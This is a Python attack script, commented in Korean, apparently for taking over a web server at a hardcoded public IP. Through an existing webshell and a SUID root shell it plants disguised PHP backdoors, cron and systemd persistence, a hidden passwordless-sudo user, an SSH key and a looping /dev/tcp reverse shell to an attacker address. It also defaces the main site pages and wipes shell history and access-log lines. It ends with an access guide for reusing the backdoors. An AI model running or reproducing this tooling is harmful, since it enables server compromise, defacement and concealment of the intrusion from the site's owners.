#!/usr/bin/env python3
"""
전체 사이트 장악 스크립트 (Full Site Takeover)
Target: 52.78.221.104

기능:
1. 다중 백도어 배포
2. 전체 사이트 디페이스
3. 영구 지속성 확보
4. IP 변경 대응
"""

import requests
import base64
import time
from urllib.parse import quote

class FullTakeover:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.webshell = f"{self.target}/uploads/x.php"
        self.session = requests.Session()

    def execute_command(self, cmd):
        """일반 명령 실행"""
        try:
            encoded = quote(cmd)
            r = self.session.get(f"{self.webshell}?x={encoded}", timeout=10)
            return r.text
        except Exception as e:
            return f"Error: {str(e)}"

    def execute_root(self, cmd):
        """루트 권한으로 명령 실행"""
        # 특수문자 처리를 위해 base64 인코딩 사용
        encoded_cmd = base64.b64encode(cmd.encode()).decode()
        root_cmd = f"./rootbash -p -c \"echo '{encoded_cmd}' | base64 -d | bash\""
        return self.execute_command(root_cmd)

    def test_connection(self):
        """연결 테스트"""
        print("[*] Testing connection...")
        result = self.execute_command("whoami")
        print(f"    Current user: {result.strip()}")

        result = self.execute_root("whoami")
        print(f"    Root access: {result.strip()}")
        return True

    def deploy_web_backdoors(self):
        """웹 백도어 다중 배포"""
        print("\n[+] Deploying web backdoors...")

        backdoors = {
            'health-check.php': '시스템 헬스체크로 위장',
            'system-check.php': '시스템 체크로 위장',
            'cache-clear.php': '캐시 클리어로 위장',
            'backup.php': '백업 파일로 위장',
            '.maintenance.php': '숨김 파일',
        }

        # 간단한 웹쉘 코드
        webshell_code = '<?php @system($_GET["x"]); ?>'
        encoded_code = base64.b64encode(webshell_code.encode()).decode()

        for filename, description in backdoors.items():
            cmd = f"echo '{encoded_code}' | base64 -d > /var/www/html/www/{filename}"
            self.execute_root(cmd)

            # 파일 권한 설정
            self.execute_root(f"chmod 644 /var/www/html/www/{filename}")
            self.execute_root(f"chown apache:apache /var/www/html/www/{filename}")

            # 파일 타임스탬프 변경 (오래된 파일로 위장)
            self.execute_root(f"touch -t 202301010000 /var/www/html/www/{filename}")

            print(f"    [✓] {filename} - {description}")

        print(f"    [✓] Total {len(backdoors)} web backdoors deployed")

    def deploy_suid_backdoors(self):
        """SUID 백도어 다중 배포"""
        print("\n[+] Deploying SUID backdoors...")

        locations = [
            ('/var/www/html/www/uploads/rootbash', '웹 경로'),
            ('/dev/shm/rootbash', '메모리 기반'),
            ('/var/tmp/rootbash', '임시 저장소'),
            ('/var/www/html/www/.cache/sys', '숨김 디렉토리'),
            ('/tmp/...', '숨김 파일명'),
        ]

        for path, description in locations:
            # 디렉토리 생성 (필요시)
            dir_path = path.rsplit('/', 1)[0]
            self.execute_root(f"mkdir -p {dir_path}")

            # SUID 바이너리 생성
            self.execute_root(f"cp /bin/bash {path}")
            self.execute_root(f"chmod 4755 {path}")

            # 검증
            result = self.execute_root(f"ls -la {path}")
            if '-rwsr-xr-x' in result:
                print(f"    [✓] {path} - {description}")
            else:
                print(f"    [✗] {path} - Failed")

    def deploy_cron_backdoor(self):
        """Cron 기반 자동 재생성 백도어"""
        print("\n[+] Deploying cron backdoor...")

        # 매 5분마다 rootbash 재생성
        cron_jobs = [
            "*/5 * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash",
            "*/5 * * * * root cp /bin/bash /dev/shm/rootbash && chmod 4755 /dev/shm/rootbash",
        ]

        for i, job in enumerate(cron_jobs):
            encoded_job = base64.b64encode(job.encode()).decode()
            cmd = f"echo '{encoded_job}' | base64 -d > /etc/cron.d/persist{i}"
            self.execute_root(cmd)
            print(f"    [✓] Cron job {i+1} installed")

    def deploy_systemd_backdoor(self):
        """Systemd 서비스 백도어"""
        print("\n[+] Deploying systemd backdoor...")

        service_content = """[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash; sleep 300; done'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target"""

        encoded_service = base64.b64encode(service_content.encode()).decode()

        # 서비스 파일 생성
        cmd = f"echo '{encoded_service}' | base64 -d > /etc/systemd/system/sys-update.service"
        self.execute_root(cmd)

        # 서비스 활성화
        self.execute_root("systemctl daemon-reload")
        self.execute_root("systemctl enable sys-update.service")
        self.execute_root("systemctl start sys-update.service")

        # 확인
        result = self.execute_root("systemctl is-active sys-update.service")
        if 'active' in result:
            print(f"    [✓] Systemd backdoor service running")
        else:
            print(f"    [!] Systemd backdoor may need manual verification")

    def create_hidden_user(self):
        """숨겨진 사용자 생성"""
        print("\n[+] Creating hidden user...")

        username = "sysupdate"
        password = "Update@2025!"

        # 사용자 생성
        self.execute_root(f"useradd -m -s /bin/bash -G wheel {username} 2>/dev/null || true")
        self.execute_root(f"echo '{username}:{password}' | chpasswd")

        # sudo 권한 부여
        sudo_rule = f"{username} ALL=(ALL) NOPASSWD: ALL"
        encoded_rule = base64.b64encode(sudo_rule.encode()).decode()
        self.execute_root(f"echo '{encoded_rule}' | base64 -d > /etc/sudoers.d/{username}")

        print(f"    [✓] User: {username}")
        print(f"    [✓] Password: {password}")
        print(f"    [✓] Sudo: NOPASSWD")

    def add_ssh_key(self):
        """SSH 키 추가"""
        print("\n[+] Adding SSH backdoor...")

        # 실제 사용 시 자신의 공개키로 교체
        ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... your_public_key_here backdoor@attacker"

        self.execute_root("mkdir -p /root/.ssh")
        self.execute_root(f"echo '{ssh_key}' >> /root/.ssh/authorized_keys")
        self.execute_root("chmod 700 /root/.ssh")
        self.execute_root("chmod 600 /root/.ssh/authorized_keys")

        print(f"    [✓] SSH key added to /root/.ssh/authorized_keys")
        print(f"    [!] Remember to replace with your actual public key")

    def deface_website(self, hacked_html_path):
        """전체 사이트 디페이스"""
        print("\n[+] Defacing website...")

        # hacked_page.html 읽기
        try:
            with open(hacked_html_path, 'r', encoding='utf-8') as f:
                hacked_content = f.read()
        except:
            print("    [✗] Failed to read hacked_page.html")
            return

        # Base64 인코딩 (특수문자 안전 전송)
        encoded_html = base64.b64encode(hacked_content.encode()).decode()

        # 백업 먼저 생성
        print("    [*] Creating backups...")
        self.execute_root("mkdir -p /root/backup_$(date +%Y%m%d)")
        self.execute_root("cp -r /var/www/html/www/*.php /root/backup_$(date +%Y%m%d)/")

        # 주요 페이지 교체
        main_pages = [
            'index.php',
            'login.php',
            'main.php',
            'profile.php',
            'search.php',
        ]

        for page in main_pages:
            # 원본 백업
            self.execute_root(f"cp /var/www/html/www/{page} /var/www/html/www/{page}.bak 2>/dev/null || true")

            # 디페이스 페이지로 교체
            cmd = f"echo '{encoded_html}' | base64 -d > /var/www/html/www/{page}"
            self.execute_root(cmd)

            print(f"    [✓] {page} defaced")

        # .htaccess로 모든 요청 리다이렉트
        htaccess_content = """RewriteEngine On
RewriteCond %{REQUEST_URI} !^/hacked_page\\.html$
RewriteCond %{REQUEST_URI} !^/uploads/
RewriteRule ^(.*)$ /index.php [L,R=302]"""

        encoded_htaccess = base64.b64encode(htaccess_content.encode()).decode()
        cmd = f"echo '{encoded_htaccess}' | base64 -d > /var/www/html/www/.htaccess"
        self.execute_root(cmd)

        print(f"    [✓] .htaccess configured for full site redirect")
        print(f"    [✓] Website defaced successfully")

    def setup_reverse_shell_listener(self):
        """리버스 쉘 자동 연결 설정"""
        print("\n[+] Setting up reverse shell auto-connect...")

        # 공격자 서버 정보 (실제 사용 시 변경)
        attacker_ip = "YOUR_IP_HERE"
        attacker_port = "4444"

        reverse_shell_script = f"""#!/bin/bash
while true; do
    bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1 2>/dev/null
    sleep 60
done"""

        encoded_script = base64.b64encode(reverse_shell_script.encode()).decode()

        # 스크립트 생성
        self.execute_root(f"echo '{encoded_script}' | base64 -d > /tmp/.connect.sh")
        self.execute_root("chmod +x /tmp/.connect.sh")

        # Cron에 추가 (매 10분마다 실행)
        cron_job = "*/10 * * * * root /tmp/.connect.sh &"
        encoded_cron = base64.b64encode(cron_job.encode()).decode()
        self.execute_root(f"echo '{encoded_cron}' | base64 -d > /etc/cron.d/autoconnect")

        print(f"    [✓] Auto-connect script deployed")
        print(f"    [!] Remember to update attacker IP: {attacker_ip}:{attacker_port}")
        print(f"    [!] Start listener: nc -lvnp {attacker_port}")

    def clean_tracks(self):
        """흔적 제거"""
        print("\n[+] Cleaning tracks...")

        commands = [
            # 히스토리 삭제
            "history -c",
            "echo '' > /root/.bash_history",

            # 로그에서 특정 패턴 제거 (IP는 실제 사용 시 변경)
            "sed -i '/rootbash/d' /var/log/httpd/access_log 2>/dev/null || true",
            "sed -i '/x.php/d' /var/log/httpd/access_log 2>/dev/null || true",

            # 백도어 파일 타임스탬프 변경
            "find /var/www/html/www -name '*check*.php' -exec touch -t 202301010000 {} \\;",
        ]

        for cmd in commands:
            self.execute_root(cmd)

        print(f"    [✓] Tracks cleaned")

    def show_access_guide(self):
        """접근 방법 안내"""
        print("\n" + "="*60)
        print("BACKDOOR ACCESS GUIDE")
        print("="*60)

        print("\n[Web Backdoors]")
        backdoors = ['health-check.php', 'system-check.php', 'cache-clear.php', 'backup.php']
        for bd in backdoors:
            print(f"  curl \"{self.target}/{bd}?x=whoami\"")

        print("\n[Root Access]")
        print(f"  curl \"{self.target}/health-check.php?x=./rootbash%20-p%20-c%20'id'\"")

        print("\n[Reverse Shell]")
        print("  1. On attacker machine:")
        print("     nc -lvnp 4444")
        print("  2. Trigger connection:")
        print(f"     curl \"{self.target}/health-check.php?x=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/YOUR_IP/4444%200>%261'\"")

        print("\n[SSH Access]")
        print("  ssh sysupdate@52.78.221.104")
        print("  Password: Update@2025!")

        print("\n[Advanced Backdoor]")
        print(f"  Browser: {self.target}/persistent_backdoor.php#access")
        print("  Password: HackThePlanet2025!")

        print("\n[Note]")
        print("  - IP 변경되어도 웹 백도어는 URL만 접속하면 사용 가능")
        print("  - 리버스 쉘은 공격자 IP 변경 시 스크립트 내 IP 수정 필요")
        print("  - SSH는 어디서든 접속 가능")

        print("\n" + "="*60)


def main():
    target = "http://52.78.221.104"

    print("="*60)
    print("  FULL SITE TAKEOVER SCRIPT")
    print("  Target: 52.78.221.104")
    print("="*60)

    takeover = FullTakeover(target)

    # 0. 연결 테스트
    try:
        if not takeover.test_connection():
            print("\n[✗] Connection test failed!")
            return
    except Exception as e:
        print(f"\n[✗] Error: {e}")
        return

    # 메뉴
    print("\n[MENU]")
    print("1. Deploy All Backdoors")
    print("2. Deface Website")
    print("3. Setup Persistence")
    print("4. Full Takeover (All Above)")
    print("5. Clean Tracks")
    print("6. Show Access Guide")
    print("0. Exit")

    while True:
        choice = input("\nSelect option: ").strip()

        if choice == '1':
            # 백도어 배포
            takeover.deploy_web_backdoors()
            takeover.deploy_suid_backdoors()
            takeover.deploy_cron_backdoor()

        elif choice == '2':
            # 디페이스
            hacked_page = "/Users/hwangjunha/Desktop/Red_basic_local/H/fin/defacement/hacked_page.html"
            takeover.deface_website(hacked_page)

        elif choice == '3':
            # 영구 지속성
            takeover.deploy_systemd_backdoor()
            takeover.create_hidden_user()
            takeover.add_ssh_key()
            takeover.setup_reverse_shell_listener()

        elif choice == '4':
            # 전체 실행
            print("\n[!] Starting full takeover...")
            time.sleep(2)

            takeover.deploy_web_backdoors()
            takeover.deploy_suid_backdoors()
            takeover.deploy_cron_backdoor()
            takeover.deploy_systemd_backdoor()
            takeover.create_hidden_user()
            takeover.add_ssh_key()

            # 디페이스 확인
            confirm = input("\n[!] Deface website? (yes/no): ").strip().lower()
            if confirm == 'yes':
                hacked_page = "/Users/hwangjunha/Desktop/Red_basic_local/H/fin/defacement/hacked_page.html"
                takeover.deface_website(hacked_page)

            takeover.setup_reverse_shell_listener()
            takeover.clean_tracks()

            print("\n[✓] Full takeover completed!")
            takeover.show_access_guide()

        elif choice == '5':
            takeover.clean_tracks()

        elif choice == '6':
            takeover.show_access_guide()

        elif choice == '0':
            print("\n[*] Exiting...")
            break

        else:
            print("[!] Invalid option")


if __name__ == "__main__":
    main()
